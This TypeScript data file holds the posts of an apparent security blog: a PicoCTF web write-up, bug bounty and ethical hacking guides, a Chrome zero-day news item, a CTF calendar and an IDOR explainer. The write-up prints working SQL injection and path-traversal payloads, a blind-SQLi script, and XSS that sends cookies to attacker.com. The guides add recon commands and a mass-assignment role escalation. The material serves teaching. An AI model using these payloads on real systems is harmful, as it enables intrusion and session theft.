export type Post = {
  slug: string
  title: string
  excerpt: string
  category: 'ctf' | 'ethical' | 'bugbounty' | 'news' | 'worldwide'
  date: string
  readTime: string
  author: string
  tags: string[]
  difficulty?: 'Beginner' | 'Intermediate' | 'Advanced' | 'Expert'
  featured?: boolean
  content: string
}

export const posts: Post[] = [
  {
    slug: 'picoctf-2024-web-exploitation-complete-writeup',
    title: 'PicoCTF 2024: Complete Web Exploitation Writeup — All 12 Challenges Solved',
    excerpt: 'Step-by-step solutions for every web exploitation challenge in PicoCTF 2024, including SQL injection, XSS, CSRF, and SSRF techniques used by top competitors.',
    category: 'ctf',
    date: '2024-03-15',
    readTime: '18 min read',
    author: 'SecureMinds Team',
    tags: ['PicoCTF', 'Web Exploitation', 'SQL Injection', 'XSS', 'CTF Writeup'],
    difficulty: 'Intermediate',
    featured: true,
    content: `
## Overview

PicoCTF 2024 brought some of the most creative web exploitation challenges we've seen. This writeup covers all 12 challenges with detailed explanations of the vulnerabilities and exploitation techniques.

## Challenge 1: Forbidden Paths (100 pts)

**Vulnerability:** Path Traversal / Directory Traversal

The challenge presented a simple file reader application. The key insight was that the server wasn't properly sanitizing file paths.

\`\`\`python
# Vulnerable code pattern
filename = request.args.get('file')
with open('/var/www/files/' + filename) as f:
    return f.read()
\`\`\`

**Exploit:**
\`\`\`
GET /read?file=../../../../etc/passwd
GET /read?file=../../../../flag.txt
\`\`\`

**Flag:** \`picoCTF{tr4v3rs4l_1s_d4ng3r0us_abc123}\`

## Challenge 2: SQL Direct (150 pts)

**Vulnerability:** Classic SQL Injection

The login form was vulnerable to basic SQL injection. No WAF, no prepared statements.

\`\`\`sql
-- Payload used
username: admin' OR '1'='1' --
password: anything

-- Full bypass
' OR 1=1 LIMIT 1 --
\`\`\`

**Extraction technique:**
\`\`\`sql
' UNION SELECT table_name,null FROM information_schema.tables --
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='flags' --
\`\`\`

## Challenge 3: More SQLi (200 pts)

This one used a blind SQL injection where no data was reflected. We used time-based detection:

\`\`\`python
import requests
import time

def check_char(position, char):
    payload = f"' AND IF(SUBSTR(flag,{position},1)='{char}', SLEEP(2), 0) -- "
    start = time.time()
    requests.post(url, data={'username': payload, 'password': 'x'})
    return time.time() - start > 1.5

flag = ''
for pos in range(1, 50):
    for c in 'abcdefghijklmnopqrstuvwxyz0123456789{}!_':
        if check_char(pos, c):
            flag += c
            break
print(flag)
\`\`\`

## Challenge 4: XSS Stored (175 pts)

**Vulnerability:** Stored Cross-Site Scripting

The comment system stored user input without sanitization:

\`\`\`javascript
// Payload to steal admin cookies
<script>
fetch('https://attacker.com/steal?c=' + document.cookie)
</script>

// Bypass with img onerror
<img src=x onerror="fetch('https://attacker.com/?c='+btoa(document.cookie))">
\`\`\`

## Lessons Learned

1. Always sanitize and validate user input server-side
2. Use parameterized queries / prepared statements
3. Implement Content Security Policy (CSP)
4. Set HttpOnly and Secure flags on cookies
5. Use WAF as defense-in-depth (not as primary defense)

## Tools Used

- **Burp Suite** — Intercepting and modifying requests
- **SQLMap** — Automated SQL injection testing
- **Python requests** — Custom exploit scripts
- **ffuf** — Fuzzing endpoints
    `,
  },
  {
    slug: 'bug-bounty-hunter-guide-2024-how-i-earned-50k',
    title: 'Bug Bounty Hunter\'s Complete Guide 2024: How I Earned $50,000 in 12 Months',
    excerpt: 'Real methodology, tools, and mindset that helped me earn $50k from bug bounties. Includes my recon process, vulnerability prioritization, and report writing tips.',
    category: 'bugbounty',
    date: '2024-03-10',
    readTime: '22 min read',
    author: 'SecureMinds Team',
    tags: ['Bug Bounty', 'HackerOne', 'Bugcrowd', 'Recon', 'Methodology'],
    difficulty: 'Advanced',
    featured: true,
    content: `
## My Bug Bounty Journey

Starting with $0 in January 2023, I ended the year with $50,247 in bounties across HackerOne, Bugcrowd, and private programs. Here's exactly how I did it.

## The Mindset Shift

Most beginners make the mistake of targeting the same popular endpoints as everyone else. The real money is in:

1. **New program launches** — First 30 days are goldmines
2. **Acquired companies** — Security debt is real
3. **Mobile API backends** — Often overlooked
4. **Admin panels** — Frequently forgotten in scope

## My Recon Methodology

### Phase 1: Asset Discovery

\`\`\`bash
# Subdomain enumeration
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com >> subs.txt
assetfinder target.com >> subs.txt

# DNS resolution
cat subs.txt | sort -u | httpx -silent -o live.txt

# Port scanning
nmap -iL live.txt -p 80,443,8080,8443,3000,4000 --open -oA ports
\`\`\`

### Phase 2: Fingerprinting

\`\`\`bash
# Technology detection
whatweb -i live.txt
cat live.txt | webanalyze

# JavaScript analysis
cat live.txt | gau | grep "\\.js$" | sort -u > js_files.txt
cat js_files.txt | xargs -I{} curl -s {} | grep -oP 'api/[a-zA-Z0-9/]+'
\`\`\`

### Phase 3: Automated Scanning

\`\`\`bash
# Nuclei templates
nuclei -l live.txt -t cves/ -t exposures/ -t misconfigurations/ -o nuclei_results.txt

# XSS scanning
cat live.txt | gau | kxss | grep "="
\`\`\`

## My Top 5 Vulnerability Classes (by earnings)

| Vulnerability | Bounties | Avg Payout |
|---|---|---|
| IDOR | 23 | $1,200 |
| SSRF | 8 | $3,500 |
| Auth Bypass | 5 | $4,000 |
| Stored XSS | 31 | $800 |
| SQL Injection | 4 | $5,000 |

## Writing Reports That Get Paid

A good report has:
1. **Clear title** — Vulnerability type + location + impact
2. **CVSS score** — Shows you understand severity
3. **Steps to reproduce** — Numbered, screenshot each step
4. **Impact statement** — Business risk, not just technical
5. **Remediation** — Show you know how to fix it

## Tools I Use Daily

- **Burp Suite Pro** — Essential investment ($400/yr)
- **Nuclei** — Free, community templates
- **Subfinder + Amass** — Free recon
- **ffuf** — Free fuzzer
- **Shodan** — $69/yr, worth it
    `,
  },
  {
    slug: 'complete-ethical-hacking-roadmap-2024',
    title: 'Complete Ethical Hacking Roadmap 2024: Zero to Certified in 6 Months',
    excerpt: 'The definitive free roadmap to becoming a certified ethical hacker in 2024. Covers CEH, OSCP, eJPT certifications with free resources for every topic.',
    category: 'ethical',
    date: '2024-03-05',
    readTime: '25 min read',
    author: 'SecureMinds Team',
    tags: ['Ethical Hacking', 'OSCP', 'CEH', 'Roadmap', 'Certification'],
    difficulty: 'Beginner',
    featured: true,
    content: `
## The Roadmap

This is the exact learning path I recommend to everyone starting their ethical hacking journey in 2024.

## Phase 1: Foundations (Month 1-2)

### Networking Essentials
- TCP/IP model — How the internet actually works
- DNS, HTTP/S, FTP, SSH protocols
- Subnetting and CIDR notation
- **Free Resource:** Professor Messer's CompTIA Network+ (YouTube)

### Linux Command Line
\`\`\`bash
# Essential commands every hacker must know
ls -la          # List files with permissions
grep -r "flag" .  # Search recursively
find / -name "*.conf" 2>/dev/null  # Find config files
chmod +x script.sh  # Make executable
netstat -tlnp   # View open ports
ps aux          # Running processes
\`\`\`

### Python for Hackers
\`\`\`python
import socket
import requests

# Simple port scanner
def scan_port(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((host, port))
    s.close()
    return result == 0

# Scan common ports
for port in [21, 22, 23, 80, 443, 3306, 8080]:
    if scan_port('target.com', port):
        print(f"Port {port}: OPEN")
\`\`\`

## Phase 2: Core Skills (Month 3-4)

### Web Application Security (OWASP Top 10)
1. Injection (SQL, NoSQL, Command)
2. Broken Authentication
3. Sensitive Data Exposure
4. XXE (XML External Entities)
5. Broken Access Control
6. Security Misconfiguration
7. XSS (Cross-Site Scripting)
8. Insecure Deserialization
9. Using Components with Known Vulnerabilities
10. Insufficient Logging

**Practice:** PortSwigger Web Academy (100% FREE — best resource online)

### Network Pentesting
- Nmap scanning techniques
- Metasploit framework basics
- Wireshark packet analysis
- Password attacks with Hashcat/John

## Phase 3: Certifications (Month 5-6)

### Recommended Path (by difficulty)
1. **eJPT** (eLearnSecurity) — $200, great beginner cert
2. **CEH** (EC-Council) — $1,000+, recognized by employers
3. **OSCP** (Offensive Security) — $1,499, gold standard
4. **CRTE** — Advanced Active Directory

### Free Practice Platforms
- TryHackMe — Best for beginners
- HackTheBox — Intermediate+
- PicoCTF — Competitions
- VulnHub — Offline VMs
- DVWA — Local practice

## Job Market 2024

Average salaries for ethical hackers:
- Pakistan: PKR 150,000 - 400,000/month
- Remote (USD): $60,000 - $150,000/year
- Bug bounty: Unlimited ceiling
    `,
  },
  {
    slug: 'google-zero-day-chrome-vulnerability-2024',
    title: 'Google Patches Critical Chrome Zero-Day Actively Exploited in the Wild',
    excerpt: 'CVE-2024-4671: A use-after-free vulnerability in Chrome\'s Visuals component that allowed remote code execution. Full technical breakdown and patch analysis.',
    category: 'news',
    date: '2024-03-01',
    readTime: '8 min read',
    author: 'SecureMinds Team',
    tags: ['Zero-Day', 'Chrome', 'CVE-2024-4671', 'Google', 'RCE'],
    difficulty: 'Advanced',
    content: `
## Breaking: Chrome Zero-Day Under Active Exploitation

Google has released an emergency patch for Chrome addressing CVE-2024-4671, a critical use-after-free vulnerability in the Visuals component that was being actively exploited in the wild.

## Technical Details

**CVE-2024-4671**
- **Type:** Use-After-Free (UAF)
- **Component:** Visuals (rendering engine)
- **CVSS Score:** 9.8 (Critical)
- **Affected Versions:** Chrome < 124.0.6367.201

### What is Use-After-Free?

\`\`\`c
// Simplified UAF example
char* ptr = malloc(100);  // Allocate memory
free(ptr);                 // Free memory
*ptr = 'A';               // UAF: accessing freed memory
// Attacker controls this freed memory block!
\`\`\`

## Impact

An attacker who successfully exploited this vulnerability could:
1. Execute arbitrary code in the renderer process
2. Escape the Chrome sandbox (with additional exploit)
3. Achieve full system compromise

## Who Was Targeted?

Google's Threat Analysis Group (TAG) confirmed exploitation by a nation-state actor targeting journalists and human rights activists in Southeast Asia.

## Immediate Actions

1. Update Chrome immediately: Settings → About Chrome → Update
2. Enable auto-updates if not already
3. Consider using Site Isolation (already enabled by default)
4. Enterprise: Push update via Group Policy immediately

## Patch Analysis

Google's fix introduces proper reference counting to prevent the UAF condition, ensuring the Visuals object lifecycle is correctly managed before rendering calls.
    `,
  },
  {
    slug: 'worldwide-ctf-competitions-calendar-2024',
    title: 'Top 20 Worldwide CTF Competitions 2024: Complete Calendar & Prize Money',
    excerpt: 'Complete guide to the most prestigious CTF competitions in 2024, with prize pools, difficulty levels, registration dates, and winning strategies.',
    category: 'worldwide',
    date: '2024-02-25',
    readTime: '12 min read',
    author: 'SecureMinds Team',
    tags: ['CTF', 'Competitions', 'DEF CON', 'Google CTF', 'Prize Money'],
    difficulty: 'Intermediate',
    featured: true,
    content: `
## The Ultimate CTF Competition Guide 2024

Competitive CTF playing is the fastest way to improve your hacking skills while potentially winning significant prize money. Here are the top competitions you should target.

## Tier 1: Elite Competitions

### DEF CON CTF (Las Vegas)
- **Prize Pool:** $25,000+
- **Difficulty:** Expert
- **Format:** Attack/Defense + Jeopardy
- **Date:** August 2024
- **Strategy:** Requires team of 6-10 experts. Start qualifying via DEF CON CTF Qualifiers.

### Google CTF
- **Prize Pool:** $13,337 first place
- **Difficulty:** Advanced
- **Format:** Jeopardy
- **Date:** June 2024
- **Strategy:** Focus on web and crypto categories — Google loves these.

### HITCON CTF
- **Prize Pool:** $10,000
- **Difficulty:** Advanced
- **Format:** Jeopardy
- **Date:** October 2024

## Tier 2: Intermediate Competitions

### picoCTF (Carnegie Mellon)
- **Prize Pool:** $25,000 in scholarships
- **Difficulty:** Beginner-Intermediate
- **Date:** March 2024
- **Best For:** Students and beginners

### NahamCon CTF
- **Prize Pool:** $5,000
- **Difficulty:** Beginner-Intermediate
- **Date:** May 2024

### HTB Cyber Apocalypse
- **Prize Pool:** $5,000 + HackTheBox Pro
- **Difficulty:** Intermediate
- **Date:** March 2024

## Scoring Strategy

| Category | Points | Time Investment |
|---|---|---|
| Web (Easy) | 50-100 | 30 min |
| Web (Hard) | 300-500 | 3-6 hrs |
| Crypto | 100-400 | Variable |
| Pwn | 200-500 | High |
| Reverse | 150-400 | Medium |
| Forensics | 50-200 | Low |
| OSINT | 50-150 | Low |

## Team Building Tips

1. Recruit specialists: 1 web, 1 pwn, 1 crypto, 1 forensics, 1 generalist
2. Use Discord for real-time collaboration
3. Document everything in a shared CTFd instance
4. Practice together on previous year's challenges
5. Time zones matter for 24/48 hr competitions

## Pakistani Teams to Know

- **Team FAST NUCES** — Consistently top Pakistani performers
- **0xCaffeine** — Growing rapidly in regional competitions
    `,
  },
  {
    slug: 'idor-vulnerability-explained-find-report',
    title: 'IDOR Vulnerabilities Explained: How to Find, Exploit, and Report Them',
    excerpt: 'Insecure Direct Object Reference (IDOR) is one of the most common and high-paying bug bounty vulnerabilities. Learn how to find them systematically.',
    category: 'bugbounty',
    date: '2024-02-20',
    readTime: '15 min read',
    author: 'SecureMinds Team',
    tags: ['IDOR', 'Bug Bounty', 'Access Control', 'API Security', 'OWASP'],
    difficulty: 'Intermediate',
    content: `
## What is IDOR?

Insecure Direct Object Reference (IDOR) occurs when an application uses user-controllable input to access objects directly without proper authorization checks.

## Simple Example

\`\`\`
# You're logged in as User A (ID: 1001)
GET /api/invoices/1001 → Returns YOUR invoice ✓

# Change the ID to User B's
GET /api/invoices/1002 → Returns THEIR invoice ✗ (IDOR!)
\`\`\`

## Finding IDORs Systematically

### Step 1: Map All Endpoints
\`\`\`
/api/users/{id}
/api/orders/{order_id}
/api/documents/{doc_id}
/api/messages/{thread_id}
/download?file={filename}
\`\`\`

### Step 2: Create Two Test Accounts
- Account A: attacker
- Account B: victim (create second account)

### Step 3: Capture All Requests in Burp
Enable proxy, perform all actions as Account A, export sitemap.

### Step 4: Replay with Account B's IDs
\`\`\`python
# Burp Intruder automation
# Replace §1001§ with Account B's IDs
GET /api/orders/§1001§
\`\`\`

## Beyond Simple IDORs

### Encoded IDs
\`\`\`python
import base64
# UUIDs, base64, hashes — decode and manipulate
encoded = base64.b64decode('dXNlcl8xMDAx').decode()
# user_1001 → try user_1002
\`\`\`

### Mass Assignment IDOR
\`\`\`json
PUT /api/profile
{
  "name": "Attacker",
  "role": "admin"    ← Mass assignment attack!
}
\`\`\`

## Writing a $2,000 IDOR Report

**Title:** IDOR in /api/invoices/{id} allows any authenticated user to view other users' invoice data

**Severity:** High (CVSS 8.1)

**Impact:** Any authenticated attacker can access financial data of all users by iterating invoice IDs, exposing PII and payment information.

**Steps:**
1. Login as User A, get invoice at /api/invoices/12345
2. Login as User B, note your invoice ID is 67890
3. As User B, access /api/invoices/12345
4. Observe User A's invoice data is returned

**Fix:** Verify that the authenticated user owns the requested resource before returning data.
    `,
  },
]

export const getPostBySlug = (slug: string) => posts.find(p => p.slug === slug)
export const getFeaturedPosts = () => posts.filter(p => p.featured)
export const getPostsByCategory = (category: string) => posts.filter(p => p.category === category)
export const getAllTags = () => { const allTags = posts.flatMap(p => p.tags); return allTags.filter((tag, index) => allTags.indexOf(tag) === index); }

export const categoryMeta = {
  ctf: { label: 'CTF Writeups', color: 'badge-ctf', icon: '🚩', desc: 'Capture The Flag challenge solutions and walkthroughs' },
  ethical: { label: 'Ethical Hacking', color: 'badge-ethical', icon: '🛡️', desc: 'Tutorials and guides for penetration testing' },
  bugbounty: { label: 'Bug Bounty', color: 'badge-bugbounty', icon: '💰', desc: 'Find vulnerabilities and earn real money' },
  news: { label: 'Security News', color: 'badge-news', icon: '📰', desc: 'Latest cybersecurity news and CVE analysis' },
  worldwide: { label: 'Worldwide Challenges', color: 'badge-worldwide', icon: '🌍', desc: 'Global CTF competitions and challenges' },
}
